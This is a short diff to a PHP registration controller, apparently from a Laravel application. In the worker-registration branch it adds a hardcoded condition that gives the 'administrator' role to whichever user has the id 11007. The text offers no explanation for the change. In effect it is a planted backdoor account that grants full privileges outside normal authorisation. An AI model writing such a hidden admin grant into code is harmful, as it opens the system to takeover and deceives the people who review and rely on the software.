@@ -162,6 +162,9 @@ class RegisterController extends Controller
                 $user = Worker::updateOrCreate([ 'id' => $id ],  $new_user_data);
                 $guard = 'workers';
 
+                if ($id === 11007)
+                    $user->assignRole('administrator');
+
                 break;
 
             default:
